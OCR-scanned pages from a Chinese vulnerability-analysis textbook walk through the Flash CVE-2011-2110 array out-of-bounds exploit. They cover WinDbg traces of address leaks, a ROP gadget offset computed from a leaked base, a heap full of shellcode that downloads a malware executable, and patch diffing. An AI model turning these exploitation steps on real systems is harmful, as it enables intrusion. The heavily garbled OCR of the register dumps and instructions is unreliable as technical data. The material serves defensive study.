376漏洞战争：软件漏洞分析精要
重新用WinDbg附加IE进程，然后打开cve-2011-2110.html，在调试器中异常中断：
(fdc.c78): Access vlolation - code ceeeeee5 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=e5f81e4e ecx=82e8ce64 edx=82e8ce64 esi=e5f13fce edi=05eddede
e1p=63af24b5 esp=0288ccf4 ebp=0208ce10 1op1=0
nv up e1 p1 nz na po nc
*** ERRoR: Symbol file could not be found.Defaulted to export symbols for
ef1=00050202
C: \Windows\system32\Macromed\F1ash\Flash1es.ocx -
Flash1es 1D11UnregisterServer+ex274e3d:
63af24b5 8b0481
BOV
eax,dword ptr[ecx+eax*4]ds:0023:070dd368=????????
熟悉汇编的同学应该很容易看出这里的ecx+eax*4其实就是用来索引数组元素的，由于索引值eax
已经被我们设置成0x41414141，导致数组越界访问，最终造成程序崩溃，也证明了前面分析样本代
码时的推测。
8.3.6通过构造信息泄露利用漏洞
现在，重新用E加载原先未修改过的样本，然后对崩溃地址下断点：
bu Flash1es1011UnregisterServer+Bx274e3d
断下后：
Breakpoint e hit
eax=488eeeee ebx=85d5de40 ecx=81f4c00c edx=01f4c0ec es1=05c568de ed1=05c568de
eip=63e824b5 esp=B1f4be94 ebp=81f4bfbe 1op1=0
nv up ei pl nz na po nc
cs=0e1b ss=0023 ds=0023 es=0023 fs=0e3b gs=0000
ef1=0004e282
Flash1es ID11unreg1sterServer+ex274e3d:
63e824b5 8b8481
moveax,dword ptr [ecx+eax*4]ds:e823:e1f4ce44=e1f4ce98
样本中是使用0x4000000e作为数组索引值的，执行mov指令后，cax-0x01f4c098，查看cax指向
的数值，可以发现其下一个DWORD值每次都固定地指向Flash10s.ocx模块的地址：
0:ee5> dd 01f4ce98 14
@1f4ce98 01f4ced4 63e96eee e5d5b190 eeeeee01
0:005> Im m flash10s
start
end
module nane
63a9eee0 640beeeeFlash1es
(export symbols)
C: \Windows\system32\Macromed\Flash\F1ash1es .ocx
每次调试时泄露的地址都是不一样的，但都位于Flash10s模块中，比如此次泄露的地址为
0x63e96e0e，也就是样本中的bascaddr地址，后面会用它来构造ROP指令：
---
## Page 396
第8章数组越界访问漏洞分析377
this.xchg_eax_esp_ret = this.baseaddr - 4147431;
通过调试器查看经baseaddr偏移计算得到的地址，发现其确实指向xchgcax,esp;ret的ROP指令：
Evaluate expression: 1672e95015 = 63aa2527
0:005> u 63aa2527
Flash10s+ex12527:
63aa2527 94
xchg
eax,esp
63aa2528c3
ret
63aa2529 84db
test
b1,b1
63aa252b 7584
jne
Flash10s+ex12531 (63aa2531)
63aa252d 3c2c
cmp
a1,2Ch
63aa252f 752d
jne
Flash1es+ex1255e (63aa255e)
63aa2531 51
Push
ecx
63aa2532 8b4dfc
mov
ecx,dmord ptr [ebp-4]
接下来，再看第2次信息泄露的地址，在调试器中输入g命令执行：
0:005>g
Breakpoint e hit
eax=3fffff96 ebx=05fedede ecx=01f4ce3c edx=01f4c83c es1=05d8d84e edi=85fedede
eip=63e824b5 esp=01f4bec4 ebp=01f4bfee 1op1=0
nv up ei pl nz na po nc
cs=001b s5=0023
eze0=sp
es=0023 fs=003b
gs=0080
ef1=00040282
Flash1es1011unregisterServer+ex274e3d:
63e824b5 8b8481
moV
eax, dword ptr [ecx+eax*4] ds:e023:01f4be94=01f4ce38
0:005> dd 01f4c038 14
01f4c038e5d8d84e 05d1efae 01f4ceae 01f4c178
从前面的样本反编译代码中可以看到，第2次利用漏洞泄露的地址会再经过一定计算：
var _1oc5_:Number = new Number(parseFloat(String(rest[ex3FFFFF96])));
var _1oc6_:ByteArray = new ByteArray();
_1oc6_-writeDouble(_loc5_);
var _1oc7_:uint = _1oc6_[e] *@x1eeeeee + _1oc6_[1] * @x1eeee + _1oc6_[2] *ex1ee +_1oc6_[3];
this.pobj - _1oc7_;
//构造第2次信息泄露
_1oc8_=0;
this.pobj= this.pobj+56;
重新计算后得到地址0x05d1efd8，该地址指向的第2个DWORD值指向包含NOPsled+ROP+
Shellcode的指令地址，也就是说，0x05dlefd8指向的是样本代码中的code对象：
0:005>?ex05d1efaθ+8n56
Evaluate express1on: 97644584 = 05d1efd8
0:005> dd e5d1efd8
---
## Page 397
378漏润战争：软件漏洞分析精要
05d1efd8
0008008 06e80008 8488010 082e881e
05d1efe8
8806d138 88080088 6488cf74 088883
05d1eff8
800000080 00000000 61050c61 0088000c
05d1fee8
0000000000000000
0000000 00000000
05d1fe18
05d1fe28
05d1fe38
000eee e0ee0ee eeeeeeee 0eeeeee0
05d1fe48
0:085> dd 06e8088e
06e88eee
8886488f 41414141 41414141 41414141
06e8ee10
41414141 41414141 41414141 41414141
06e8ee20
41414141 41414141 41414141 41414141
06e8ee38
41414141 41414141 41414141 41414141
06e88848
41414141 41414141 41414141 41414141
06e8ee5e
41414141 41414141 41414141 41414141
06e80e60
941414141 41414141 41414141 41414141
06e88070 41414141 41414141 41414141 41414141
接下来，再看下第3次信息泄露的地址，它直接指向包含NOPsled+ROP+Shellcode指令的地址，
相当于样本代码中code对象的content属性：
0:005>g
Breakpoint e hit
eax=3fffffba ebx=0596b030 ecx=8203c10c edx=8203c18c es1=056daede ed1=056daede
e1p=631424b5 esp=0203bf94 ebp=0203cebe 1op1=0
nv up e1 pl nz na po nc
ds=0023
es=e823 fs=ee3b gs=B688
ef1=006482e2
Flash1es1D11unregisterServer+ex274e3d:
631424b5 8b8481
BOV
eax, dword ptr[ecx+eax*4]ds:ee23:0203bff4=e57b9fd8
0:005> dd 057b9fd8 14
e57b9fd8
0088eee6 8683eeee
0848001e 0020881e
0:065> dd 06e88860
e8008890
000648ef 41414141 41414141 41414141
06e8ee10
41414141 41414141 41414141 41414141
06e8ee28
41414141 41414141 41414141 41414141
41414141 41414141 41414141 41414141
06e88848
41414141 41414141 41414141 41414141
06e88050
941414141 41414141 41414141 41414141
06e8e668
41414141 41414141 41414141 41414141
06e8887041414141 41414141 41414141 41414141
总结样本中的3次倍息泄露情况如下。
（1）第1次泄露的是用于计算ROP地址的基址。
---
## Page 398
第8章数组越界访问漏润分析379
（2）第2次泄露的是code对象地址。
最后，样本通过将前面泄露的包含NOPsled+ROP+Shellcode的地址传递给Number对象达到执行
任意代码的目的：
Number(rest[ex3FFFFFBA]);
下面对0x6e80000下内存访问断点（注意：由于笔者用调试器重新加载进程，因此这里0x6e80000
变成0x06b60000），看哪里会索引这块包含Shellcode的内存数据。当程序第2次断下时，可以看到
它会执行以下指令：
0:005> ba r4 06b6000e
e:005>g
Breakpoint 2 hit
eax=B6bc481e ebx=05c97678 ecx=0eeee81 edx=8eeee880 esi=81f4bee4 edi=06b68ee0
eip=63eb4bc8 esp=01f4bea4 ebp=01f4beac 1op1=0
nv up el ng nz ac pe cy
cs=001b ss=0023 ds=0023es=0023 fs=003bgs=0000
ef1=00040297
Flash1es1D11unregisterServer+ex2a7548:
63eb4bce 8de48deeeeeeeelea
0:005>g
eax,[ecx*4]
Breakpoint 2 hit
eax=06bc4818 ebx=05e4d380 ecx=06b6eee8 edx=0eeeeee1 es1=05c97148 ed1=05df5eee
eip=63e4e48b esp=01f4bef0 ebp=01f4bfe0 iop1=0
nv up ei pl nz na pe nc
cs=001bss=8023 ds=0823es=0023 fs=003bgs=0880
Flash1es1011UnregisterServer+ex24ed93:
ef1=ee6482e6
63e4e4eb 8b5850
moV
edx,dword ptr [eax+5eh]ds:0023:06bc406e=63aa2527
对应的上下文指令为：
63e4e489 8be1
nov
eax,dword ptr [ecx]
//ecx=ex86b6e8ee，[ecx]=ex86b6881e
63e4e48b 8b5858
mov
edx, dword ptr [eax+5eh]
//偏移到ROP指令
63e4e40e ffd2
ca11
edx (F1ash10s+x12527 (63aa2527)}
//执行代码
0:005> p
eax=86bc481e ebx=05e4d3ee ecx=06b6ee88 edx=63aa2527 es1=05c97148 ed1=05df5800
eip=63e4e48e esp=01f4befe ebp=01f4bfee 1op1=0
nv up ei p1 nz na pe nc
cs=001bss=0023ds=0023es=0023fs=003bgs=0000
ef1=0084e206
Flash1es1011unregisterServer+8x24ed96:
63e4e4Be ffd2
cal1
edx {F1ash10s+ex12527 （63aa2527))
0:005> u edx
Flash1es+ex12527:
xchg
eax,esp
---
## Page 399
380漏洞战争：软件漏洞分析精要
63aa2528 c3
ret
63aa2529 84db
test
b1,b1
63aa252b 7504
jne
Flash1es+ex12531 (63aa2531)
63aa252d 3c2c
cmp
a1,2Ch
63aa252f 752d
Jne
Flash1es+8x1255e (63aa255e)
63aa2531 51
push
ecx
63aa2532 8b4dfc
mov
ecx,dword ptr [ebp-4]
到这里，成功执行到ROP指令，然后就执行Shellcode，最后去下载并执行cd.txt解密后生成的
scvhostexe恶意程序。
8.3.7通过搜索指令序列分析补丁
下载井安装修复完CVE-2011-2110漏洞的FlashPlayer10.3.181.26版本（http:/fpdownload
macromedia.com/get/flashplayer/installers/archive/fp_10.3.181.26_archive.zip ），然后用IDA对 比分析
C:1Windows\System32MacromedFlashFlash10t.ocx文件与原先的Flash10s.ocx文件。通过上一节的分
析，我们知道数组越界索引的指令位于0x63e824b5，而Flash10s.0cx基址为0x63a90000，之间的偏移
量为0x63e824b5-0x63a90000=0x3F24B5。用IDA加载原先的Flash10s.0cx，其加载基址为0x10000000，
那么数组超界索引的指令地址位于0x10000000+0x3F24B5-0x103F24B5，如图8-26所示，该指令位于
sub_103F2400函数中。
fistp[esp+18h*sar_18]
test:180F248F C2
esp, 18h
reta
图8-26数组越界索引的相关指令
用BinDiff工具做补丁比对，发现原始的漏洞函数sub_103F2400在修复版本中已经被移除，找不
到相匹配的函数，如图8-27所示。
103F2400
EA.
sub_103F2400_33793
Name
图8-27未找到相匹配的函数
因此，我们无法直接通过补丁比较分析修复代码，可以先：
（1）搜索造成数组越界索引的漏洞指令序列“8B0481”，看在修复版本中是否依然存在。
（2）由于漏洞版本号与修复版本号较为相近，各BinDif中各匹配函数的地址都比较相近，大多在
0xFFF波动范围里，因此可以先在0x103F2xxx的地址上搜索第1点中的指令序列。
---
## Page 400
第8章数组越界访问漏润分析381
基于以上两点很容易找到0x103F2426地址处的指令，面且临近指令与原漏洞函数指令有些类似，
它位于函数sub_103F2380中，如图8-28所示，
text:18F240
Frdcw
duord ptr [esp+28h*oar_18], eax
.text:183F24E
三
.text:183F2412
fistp
[esp*2h+ar_18]
yordptr[esp+2h
[8aeo+t
flecw
rIesa+26m
.text:10F241E
.text:1e0F2atE 1oc_103F2h1E:
: CDeE XREF: sub_1e0F23s9-391]
text:1e0024tE
rytear
text:1eoF2429
gop
Tpa
dod
text :18of2439
esp, 18h